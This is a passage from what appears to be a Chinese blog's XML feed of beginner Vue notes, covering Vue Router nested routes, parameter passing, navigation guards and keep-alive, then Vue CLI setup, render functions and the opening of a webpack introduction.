class="line">&#x2F;user&#x2F;foo&#x2F;profile                     &#x2F;user&#x2F;foo&#x2F;posts</span><br><span class="line">+------------------+                  +-----------------+</span><br><span class="line">| User             |                  | User            |</span><br><span class="line">| +--------------+ |                  | +-------------+ |</span><br><span class="line">| | Profile      | |  +------------&gt;  | | Posts       | |</span><br><span class="line">| |              | |                  | |             | |</span><br><span class="line">| +--------------+ |                  | +-------------+ |</span><br><span class="line">+------------------+                  +-----------------+</span><br></pre></td></tr></table></figure><p>借助 <code>vue-router</code>，使用嵌套路由配置，就可以很简单地表达这种关系。</p><p>比如，我们需要访问home界面，某一个板块，例如首页的新闻界面/home/news，又或者是消息页面/home/message。我们就可以使用路由嵌套，步骤如下</p><ol><li>创建对应的子组件, 并且在路由映射中配置对应的子路由.</li><li>在组件内部使用<router-view>标签.</router-view></li></ol><p>![image-20201001173532463](六、Vue Router入门/image-20201001173532463.png)</p><p>router index.js代码（挂载子组件路由）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">'/home'</span>,</span><br><span class="line">    name: <span class="string">'Home'</span>,</span><br><span class="line">    component: Home,</span><br><span class="line">        meta: &#123;</span><br><span class="line">      title:<span class="string">'首页'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    children: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: <span class="string">'news'</span>,</span><br><span class="line">      name: <span class="string">'HomeNews'</span>, <span class="comment">//注意，嵌套路由不能加'/'</span></span><br><span class="line">      component: HomeNews,</span><br><span class="line">          meta: &#123;</span><br><span class="line">      title:<span class="string">'新闻'</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      path:<span class="string">'message'</span>,</span><br><span class="line">      name: <span class="string">'HomeMessage'</span>,</span><br><span class="line">      component: HomeMessage,</span><br><span class="line">          meta: &#123;</span><br><span class="line">      title:<span class="string">'消息'</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>结果</p><p>![image-20201001173920512](六、Vue Router入门/image-20201001173920512.png)</p><h2 id="路由默认路径"><a href="#路由默认路径" class="headerlink" title="路由默认路径"></a>路由默认路径</h2><p>![image-20201002084949584](六、Vue Router入门/image-20201002084949584.png)</p><h1 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h1><p>参数传递主要有两种，一种是通过params，另外一种就是通过query</p><ol><li><p><strong>params的类型:</strong></p><ul><li>配置路由格式: /router/:id</li><li>传递的方式: 在path后面跟上对应的值</li><li>传递后形成的路径: /router/a, /router/b</li></ul></li><li><p><strong>query的类型:</strong></p><ul><li><p>配置路由格式: /router, 也就是普通配置</p></li><li><p>传递的方式: 对象中使用query的key作为传递方式</p></li><li><p>传递后形成的路径: /router?id=123, /router?id=abc</p></li></ul></li></ol><p>使用方式</p><p>使用方式主要有两种，一种是通过<router-link>标签的形式，另外一种是直接通过js代码实现</router-link></p><p>params传递参数的方式在动态路由那里已经有讲到，这里主要讲query传递参数的方式</p><p>router-link标签方式（path指定路径，query指定传递的参数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link :to&#x3D;&quot;&#123;path:&#39;&#x2F;home&#x2F;message&#39;,query:&#123;name:&#39;你好啊&#39;,age:19&#125;&#125;&quot; tag&#x3D;&quot;button&quot;&gt;消息&lt;&#x2F;router-link&gt;</span><br></pre></td></tr></table></figure><p>js方式</p><p>自定义标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click&#x3D;&quot;homeMessageClick&quot;&gt;消息&lt;&#x2F;button&gt;</span><br></pre></td></tr></table></figure><p>点击绑定事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">homeMessageClick() &#123;</span><br><span class="line">  <span class="keyword">this</span>.$router.push(&#123;</span><br><span class="line">    path: <span class="string">'/home/message'</span>,</span><br><span class="line">    query: &#123;</span><br><span class="line">      name: <span class="string">'小米'</span>,</span><br><span class="line">      age: <span class="number">18</span></span><br><span class="line">    &#125;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h1><p><strong>简介：</strong></p><blockquote><p><strong>URL指的是统一资源定位符（*</strong>Uniform Resource Locator<strong>*）</strong>。URL无非就是一个给定的独特资源在Web上的地址。理论上说，每个有效的URL都指向一个独特的资源。这个资源可以是一个HTML页面，一个CSS文档，一幅图像，等等。而在实际中，有一些例外，最常见的情况就是URL指向了不存在的或是被移动过的资源。由于通过URL呈现的资源和URL本身由Web服务器处理，因此web服务器的拥有者需要认真地维护资源以及与它关联的URL。</p></blockquote><p>以下源于百度百科</p><p>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</p><p><strong>protocol（协议）</strong></p><p>指定使用的传输协议，下表列出 protocol 属性的有效方案名称。 最常用的是<a href="https://baike.baidu.com/item/HTTP协议" target="_blank" rel="noopener">HTTP协议</a>，它也是WWW中应用最广的协议。</p><p>file 资源是本地计算机上的文件。格式file:///，注意后边应是三个斜杠。</p><p>ftp 通过 FTP访问资源。格式 FTP://</p><p>gopher 通过 Gopher 协议访问该资源。</p><p>http 通过 HTTP 访问该资源。 格式 HTTP://</p><p>https 通过安全的 HTTPS 访问该资源。 格式 HTTPS://</p><p>mailto 资源为电子邮件地址，通过 SMTP 访问。 格式 mailto:</p><p>MMS 通过 支持MMS（<a href="https://baike.baidu.com/item/流媒体" target="_blank" rel="noopener">流媒体</a>）协议的播放该资源。（代表软件：Windows Media Player）格式 MMS://</p><p>ed2k 通过 支持ed2k（专用下载链接）协议的P2P软件访问该资源。（代表软件：<a href="https://baike.baidu.com/item/电驴" target="_blank" rel="noopener">电驴</a>） 格式 ed2k://</p><p>Flashget 通过 支持Flashget:（专用下载链接）协议的P2P软件访问该资源。（代表软件：快车） 格式 Flashget://</p><p>thunder 通过 支持thunder（专用下载链接）协议的P2P软件访问该资源。（代表软件：<a href="https://baike.baidu.com/item/迅雷" target="_blank" rel="noopener">迅雷</a>） 格式 thunder://</p><p>news 通过 NNTP 访问该资源。</p><p><strong>hostname（主机名）</strong></p><p>是指存放资源的服务器的<a href="https://baike.baidu.com/item/域名系统" target="_blank" rel="noopener">域名系统</a>(DNS) 主机名或 IP 地址。有时，在主机名前也可以包含连接到服务器所需的用户名和密码（格式：username:password@hostname）。</p><p><strong>port（端口号）</strong></p><p>整数，可选，省略时使用方案的默认端口，各种<a href="https://baike.baidu.com/item/传输协议" target="_blank" rel="noopener">传输协议</a>都有默认的端口号，如http的默认端口为80。如果输入时省略，则使用默认端口号。有时候出于安全或其他考虑，可以在服务器上对端口进行重定义，即采用非标准端口号，此时，URL中就不能省略端口号这一项。</p><p><strong>path（路径）</strong></p><p>由零或多个“/”符号隔开的字符串，一般用来表示主机上的一个目录或文件地址。</p><p><strong>parameters（参数）</strong></p><p>这是用于指定特殊参数的可选项。</p><p><strong>query(查询)</strong></p><p>可选，用于给<a href="https://baike.baidu.com/item/动态网页" target="_blank" rel="noopener">动态网页</a>（如使用CGI、ISAPI、PHP/JSP/ASP/ASP.NET等技术制作的网页）传递参数，可有多个参数，用“&amp;”符号隔开，每个参数的名和值用“=”符号隔开。</p><p><strong>fragment（信息片断）</strong></p><p>字符串，用于指定网络资源中的片断。例如一个网页中有多个名词解释，可使用fragment直接定位到某一名词解释。</p><h1 id="参数获取"><a href="#参数获取" class="headerlink" title="参数获取"></a>参数获取</h1><p>params的通过<code>$route.params</code>获取数据</p><p>query的通过<code>$route.query</code>获取数据</p><p>这里注意：这里是使用$route<strong>（不是$router！！！）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;lalala，我叫&#123;&#123;$route.params&#125;&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;h1&gt;lalala，我叫&#123;&#123;$route.query&#125;&#125;&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure><p>$route主要是用来动态获取当前路由</p><p>$router是用来获取路由对象</p><h1 id="route和-router的区别"><a href="#route和-router的区别" class="headerlink" title="$route和$router的区别"></a>$route和$router的区别</h1><p>$router为VueRouter实例，想要导航到不同URL，则使用$router.push方法</p><p>$route为当前router跳转对象（动态获取到当前跳转到的路由路径），里面可以获取当前路径的name、path、query、params等 </p><h1 id="所有组件都会继承自Vue的原型-prototype"><a href="#所有组件都会继承自Vue的原型-prototype" class="headerlink" title="所有组件都会继承自Vue的原型(prototype)"></a>所有组件都会继承自Vue的原型(prototype)</h1><p>如果你给Vue实例定义一个属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype.name = <span class="string">'你好'</span></span><br></pre></td></tr></table></figure><p>那么，它的组件同样也会继承这个name属性，你可以在子组件中去访问这个属性</p><p>vue中使用Object.defineProperty(‘类’,’键’,’值’)去定义类的属性</p><h1 id="导航守卫"><a href="#导航守卫" class="headerlink" title="导航守卫"></a>导航守卫</h1><h2 id="简介以及使用"><a href="#简介以及使用" class="headerlink" title="简介以及使用"></a>简介以及使用</h2><p>首先解释下导航的含义：“导航”表示路由正在发生改变。</p><p>然后上官方介绍</p><blockquote><p>正如其名，<code>vue-router</code> 提供的导航守卫主要用来通过跳转或取消的方式守卫导航。有多种机会植入路由导航过程中：全局的, 单个路由独享的, 或者组件级的。</p><p>记住<strong>参数或查询的改变并不会触发进入/离开的导航守卫</strong>。你可以通过<a href="https://router.vuejs.org/zh/guide/essentials/dynamic-matching.html#响应路由参数的变化" target="_blank" rel="noopener">观察 <code>$route</code> 对象</a>来应对这些变化，或使用 <code>beforeRouteUpdate</code> 的组件内守卫。</p></blockquote><p>其他较为容易理解的解释</p><blockquote><p>vue-router提供的导航守卫主要用来监听监听路由的进入和离开的.</p><p>vue-router提供了beforeEach和afterEach的钩子函数, 它们会在路由即将改变前和改变后触发.</p></blockquote><p>这里提出一个相关的案例需求，如果希望自己的页面每次跳转时，网页标题都会相应的改变，变成与其匹配的title标题呢，有两种方式</p><ol><li><p>通过mounted声明周期函数, 执行对应的代码进行修改</p></li><li><p>另外一种就是导航守卫，通过监听路由跳转的不同页面去动态更改（index.js）</p><p>首先在index.js文件中为每个路由定义meta属性定义所需数据，接着在后面定义一个beforeEach钩子函数去动态定义标题</p><ul><li><p>导航钩子的三个参数解析:</p><ul><li><p>to: 即将要进入的目标的路由对象.</p></li><li><p>from: 当前导航即将要离开的路由对象.</p></li><li><p>next: 调用该方法后, 才能进入下一个钩子</p></li></ul></li></ul><p>![image-20201002093437922](六、Vue Router入门/image-20201002093437922.png)</p></li></ol><h2 id="导航守卫类型"><a href="#导航守卫类型" class="headerlink" title="导航守卫类型"></a>导航守卫类型</h2><p><a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html#%E5%85%A8%E5%B1%80%E5%89%8D%E7%BD%AE%E5%AE%88%E5%8D%AB" target="_blank" rel="noopener">全局导航守卫</a></p><ol><li><code>router.beforeEach()</code>~前置钩子</li><li><code>router.afterEach()</code>~后置钩子</li></ol><p><a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html#%E8%B7%AF%E7%94%B1%E7%8B%AC%E4%BA%AB%E7%9A%84%E5%AE%88%E5%8D%AB" target="_blank" rel="noopener">路由独享守卫</a></p><p><a href="https://router.vuejs.org/zh/guide/advanced/navigation-guards.html#%E7%BB%84%E4%BB%B6%E5%86%85%E7%9A%84%E5%AE%88%E5%8D%AB" target="_blank" rel="noopener">组件导航守卫</a></p><h2 id="完整的导航解析流程"><a href="#完整的导航解析流程" class="headerlink" title="完整的导航解析流程"></a>完整的导航解析流程</h2><ol><li>导航被触发。</li><li>在失活的组件里调用 <code>beforeRouteLeave</code> 守卫。</li><li>调用全局的 <code>beforeEach</code> 守卫。</li><li>在重用的组件里调用 <code>beforeRouteUpdate</code> 守卫 (2.2+)。</li><li>在路由配置里调用 <code>beforeEnter</code>。</li><li>解析异步路由组件。</li><li>在被激活的组件里调用 <code>beforeRouteEnter</code>。</li><li>调用全局的 <code>beforeResolve</code> 守卫 (2.5+)。</li><li>导航被确认。</li><li>调用全局的 <code>afterEach</code> 钩子。</li><li>触发 DOM 更新。</li><li>调用 <code>beforeRouteEnter</code> 守卫中传给 <code>next</code> 的回调函数，创建好的组件实例会作为回调函数的参数传入。</li></ol><h1 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h1><blockquote><p>keep-alive 是 Vue 内置的一个组件，可以使被包含的组件保留状态，或避免重新渲染。（使用created()和destroyed()验证该组件）</p></blockquote><p>有两个组件函数必须在它的基础下才能使用</p><ul><li>activated()  当前路由活跃状态下调用的函数</li><li>deactivated() 路由跳转后之前路由调用的函数</li></ul><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>pinclude - 字符串或正则表达，只有匹配的组件会被缓存</p><p>pexclude - 字符串或正则表达式，任何匹配的组件都不会被缓存</p><h2 id="实现保留首页切换后最后一次保留的位置"><a href="#实现保留首页切换后最后一次保留的位置" class="headerlink" title="实现保留首页切换后最后一次保留的位置"></a>实现保留首页切换后最后一次保留的位置</h2><p>使用keep-alive标签包裹router-view</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;keep-alive&gt;</span><br><span class="line">  &lt;router-view&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;keep-alive&gt;</span><br></pre></td></tr></table></figure><p>使用组件内导航守卫在当前路由跳转到其他路由后最后一次定位到的嵌套路由保留下来，假设现在首页有新闻，消息等子路由，然后你切换到另一个和首页同级的路由，之后再切换回首页时，想保留首页最后一次点击的子路由，你就可以使用这个标签完成这个功能</p><ol><li><p>首先在当前组件内定义变量接收path路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data() &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    path: <span class="string">'/home/news'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>beforeRouteLeave()</code>接收最后一次的路由路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beforeRouteLeave(to,<span class="keyword">from</span>,next) &#123;</span><br><span class="line">  <span class="keyword">this</span>.path = <span class="keyword">this</span>.$route.path</span><br><span class="line">  next()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>使用activated函数在当前组件活跃状态实现路由跳转</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">activated() &#123;</span><br><span class="line">  <span class="keyword">this</span>.$router.push(<span class="keyword">this</span>.path)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>五、CLI入门</title>
      <link href="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/"/>
      <url>/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p><a href="https://cli.vuejs.org/" target="_blank" rel="noopener">CLI官网</a>：Vue CLI 致力于将 Vue 生态中的工具基础标准化。它确保了各种构建工具能够基于智能的默认配置即可平稳衔接，这样你可以专注在撰写应用上，而不必花好几天去纠结配置的问题。与此同时，它也为每个工具提供了调整配置的灵活性，无需 eject。</p></blockquote><p><strong>它具有以下特点</strong></p><ul><li>通过 <code>@vue/cli</code> 实现的交互式的项目脚手架。</li><li>通过 <code>@vue/cli</code> + <code>@vue/cli-service-global</code> 实现的零配置原型开发。</li><li>一个运行时依赖 (<code>@vue/cli-service</code>)，该依赖：<ul><li>可升级；</li><li>基于 webpack 构建，并带有合理的默认配置；</li><li>可以通过项目内的配置文件进行配置；</li><li>可以通过插件进行扩展。</li></ul></li><li>一个丰富的官方插件集合，集成了前端生态中最好的工具。</li><li>一套完全图形化的创建和管理 Vue.js 项目的用户界面。</li></ul><p><strong>在使用它的前提下你得配置好</strong><a href="http://nodejs.cn/download/" target="_blank" rel="noopener">node</a><strong>环境以及安装</strong><a href="https://www.webpackjs.com/" target="_blank" rel="noopener">webpack</a></p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>最新版全局安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @vue/cli</span><br></pre></td></tr></table></figure><p>拉取Vue CLI2版本方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g @vue/cli-init</span><br></pre></td></tr></table></figure><p>Vue CLI2 初始化项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue init webpack 项目名</span><br></pre></td></tr></table></figure><p>Vue CLI3初始化项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue create 项目名</span><br></pre></td></tr></table></figure><h1 id="Vue-CLI2"><a href="#Vue-CLI2" class="headerlink" title="Vue CLI2"></a>Vue CLI2</h1><h2 id="Vue-CLI2-安装过程"><a href="#Vue-CLI2-安装过程" class="headerlink" title="Vue CLI2 安装过程"></a>Vue CLI2 安装过程</h2><ul><li>Project name：项目名字</li><li>Project decription：项目描述</li><li>Author：作者</li><li>Vue build：是选择runtime还是runtime+ compiler</li><li>Install vue-router： 安装vue-router</li><li>Use ESLint to lint your code：ESLint检测代码规范性</li><li>Set up unit tests：单元测试</li><li>Setup e2e tests with Nightwatch：end to end测试，是一个自动化测试的框架</li><li>npm or yarn 选择npm包管理工具还是yarn包管理工具</li></ul><h2 id="Vue-CLI2-目录"><a href="#Vue-CLI2-目录" class="headerlink" title="Vue CLI2 目录"></a>Vue CLI2 目录</h2><ul><li>build和config文件夹：对webpack进行相关配置</li><li>node_modules文件夹：node模块</li><li>src文件夹：书写代码的文件夹</li><li>static文件夹：保存不希望进行转换的固定文件</li><li>.babelrc：ES代码配置</li><li>.editorconfig：编码约束以及简化</li><li>.eslintignore：忽略代码检测的文件夹或文件</li><li>.gitignore：忽略git上传的文件夹或文件</li><li>.eslintrc.js：代码规范相关配置</li><li>.postcssrc.js：检测css配置</li><li>index.html：html模板</li><li>package.json：包管理文件</li><li>package-lock.json：锁定node模块版本</li><li>readme.md：markdown语法的项目说明文件</li></ul><h1 id="Runtime-Compiler和Runtime-only的区别"><a href="#Runtime-Compiler和Runtime-only的区别" class="headerlink" title="Runtime-Compiler和Runtime-only的区别"></a>Runtime-Compiler和Runtime-only的区别</h1><p><a href="https://cn.vuejs.org/v2/guide/installation.html#%E8%BF%90%E8%A1%8C%E6%97%B6-%E7%BC%96%E8%AF%91%E5%99%A8-vs-%E5%8F%AA%E5%8C%85%E5%90%AB%E8%BF%90%E8%A1%8C%E6%97%B6" target="_blank" rel="noopener">官网介绍</a></p><p><a href="https://segmentfault.com/a/1190000020253015" target="_blank" rel="noopener">文章分享</a></p><blockquote><p>如果你需要在客户端编译模板 (比如传入一个字符串给 <code>template</code> 选项，或挂载到一个元素上并以其 DOM 内部的 HTML 作为模板)，就将需要加上编译器，即完整版</p><p>当使用 <code>vue-loader</code> 或 <code>vueify</code> 的时候，<code>*.vue</code> 文件内部的模板会在构建时预编译成 JavaScript。你在最终打好的包里实际上是不需要编译器的，所以只用运行时版本即可。</p><p>因为运行时版本相比完整版体积要小大约 30%，所以应该尽可能使用这个版本。如果你仍然希望使用完整版，则需要在打包工具里配置一个别名：</p></blockquote><p>简单来说</p><ol><li><p>如果在之后的开发中，你依然使用template，就需要选择Runtime-Compiler</p></li><li><p>如果你之后的开发中，使用的是.vue文件夹开发，那么可以选择Runtime-only</p></li></ol><h1 id="render和template"><a href="#render和template" class="headerlink" title="render和template"></a>render和template</h1><p>如果你研究下脚手架帮我们生成的代码，你会发现它引入模板的方式和前面不太一样</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/image-20200926075409137.png" alt="image-20200926075409137"></p><p>这究竟是为啥嘞</p><p>直接上图（vue运行过程图）</p><blockquote><p>如果使用template的话，她会走这么一条路径（runtime-compiler）</p><p>template→ast→render→virtual dom→UI</p><p>而如果使用render函数的话（runtime only）</p><p>render→virtual dom→UI</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/image-20200925215935167.png" alt></p><p>render使用方式（三种）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//1.渲染页面，将app模板挂载在#app上</span></span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line"></span><br><span class="line">  <span class="comment">//2.直接定义型</span></span><br><span class="line">  render: <span class="function"><span class="params">createElement</span> =&gt;</span> createElement(<span class="string">'h1'</span>,&#123;<span class="attr">style</span>:<span class="string">"color: skyblue"</span>&#125;,[<span class="string">'测试'</span>]),</span><br><span class="line"></span><br><span class="line">  <span class="comment">//3.内嵌套型</span></span><br><span class="line">  render: <span class="function"><span class="params">createElement</span> =&gt;</span> createElement(<span class="string">'a'</span>,&#123;<span class="attr">class</span>:<span class="string">"pink"</span>&#125;,[<span class="string">'测试'</span>,h(<span class="string">'button'</span>,[<span class="string">'点我'</span>])])</span><br><span class="line"></span><br><span class="line">&#125;).$mount(<span class="string">'#app'</span>)</span><br></pre></td></tr></table></figure><h1 id="build和dev"><a href="#build和dev" class="headerlink" title="build和dev"></a>build和dev</h1><h2 id="npm-run-build"><a href="#npm-run-build" class="headerlink" title="npm run build"></a>npm run build</h2><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/image-20200926081124706.png" alt="image-20200926081124706"></p><h2 id="npm-run-dev"><a href="#npm-run-dev" class="headerlink" title="npm run dev"></a>npm run dev</h2><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/image-20200926081300830.png" alt="image-20200926081300830"></p><h1 id="Vue-CLI4"><a href="#Vue-CLI4" class="headerlink" title="Vue CLI4"></a>Vue CLI4</h1><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/image-20200926083133079.png" alt="image-20200926083133079"></p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>大体和CLI2差不多，会少了很多配置文件（被隐藏起来，下面会讲到）</p><p>大致可以参考CLI2，这里public文件夹相当于CLI2的文件夹</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/image-20200926083245483.png" alt="image-20200926083245483"></p><h2 id="配置查看以及修改🔺"><a href="#配置查看以及修改🔺" class="headerlink" title="配置查看以及修改🔺"></a>配置查看以及修改🔺</h2><p>一共有三种方法可以查看配置或是修改配置</p><p><a href="https://cli.vuejs.org/zh/config/" target="_blank" rel="noopener">官网配置参考</a></p><ol><li><p>vue ui</p><p>cmd命令输入vue ui，然后你就可以打开一个GUI，可以用来查看项目，创建项目、导入项目，还可以对项目进行相关配置</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/image-20200926083843019.png" alt="image-20200926083843019"></p><p>导入项目后，你就可以查看并修改添加该项目的插件、依赖、配置、以及任务启动等相关配置</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/image-20200926083929062.png" alt="image-20200926083929062"></p></li><li><p>那么它的配置文件隐藏到哪里了呢，在node_modules文件夹下按下图路径便可以找到webpack的配置文件，同时它又定义另外一个文件去存储一大堆相关的配置，目前这些文件是不容许你修改的</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/image-20200926084207992.png" alt="image-20200926084207992"></p></li><li><p>那么我们要修改该怎么办，可以自定义一个文件，目前这个文件名必须是固定的→vue.config.js</p><p>然后就可以在里面添加我们想添加的相关配置，放心，他会和默认的webpack.config.js文件中的配置合并起来的</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%94%E3%80%81Vue-CLI%E5%85%A5%E9%97%A8/image-20200926084632860.png" alt="image-20200926084632860"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
            <tag> Vue入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四、webpack入门</title>
      <link href="/2021/03/01/%E5%9B%9B%E3%80%81webpack%E5%85%A5%E9%97%A8/"/>
      <url>/2021/03/01/%E5%9B%9B%E3%80%81webpack%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="认识"><a href="#认识" class="headerlink" title="认识"></a>认识</h2><p><a href="https://www.webpackjs.com/concepts/" target="_blank" rel="noopener">官方文档</a></p><blockquote><p><strong>简介：</strong>本质上，<em>webpack</em> 是一个现代 JavaScript 应用程序的<em>静态模块打包器(module bundler)<em>。当 webpack 处理应用程序时，它会递归地构建一个</em>依赖关系图(dependency graph)*，其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 *bundle</em></p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E5%9B%9B%E3%80%81webpack%E5%85%A5%E9%97%A8/image-20200921194136709.png" alt="image-20200921194136709"></p><p>两个点来解释上面这段话：<strong>模块</strong> 和 <strong>打包</strong></p><h3 id="前端模块化"><a href="#前端模块化" class="headerlink" title="前端模块化"></a>前端模块化</h3><ol><li><p>webpack其中一个核心就是让我们可能进行模块化开发，并且会帮助我们处理模块间的依赖关系。</p></li><li><p>而且不仅仅是JavaScript文件，我们的CSS、图片、json文件等等在webpack中都可以被当做模块来使用（在后续我们会看到）。</p></li></ol><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><ol><li>将webpack中的各种资源模块进行打包合并成一个或多个包(Bundle)。</li><li>并且在打包的过程中，还可以对资源进行处理，比如压缩图片，将scss转成css，将ES6语法转成ES5语法，将TypeScript转成JavaScript等等操作。</li></ol><h3 id="和grunt-gulp的对比"><a href="#和grunt-gulp的对比" class="headerlink" title="和grunt/gulp的对比"></a>和grunt/gulp的对比</h3><ol><li>grunt/gulp更加强调的是前端流程的自动化，模块化不是它的核心。</li><li>webpack更加强调模块化开发管理，而文件压缩合并、预处理等功能，是他附带的功能。</li></ol><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>要先安装node</p><p>检测node环境</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i webpack --save-dev</span><br></pre></td></tr></table></figure><p>为什么全局安装后要还要局部安装</p><ol><li>在终端直接执行webpack命令，使用的全局安装的webpack</li><li>当在package.json中定义了scripts，其中包含了webpack命令，那么使用的是局部webpack</li></ol><h2 id="起步"><a href="#起步" class="headerlink" 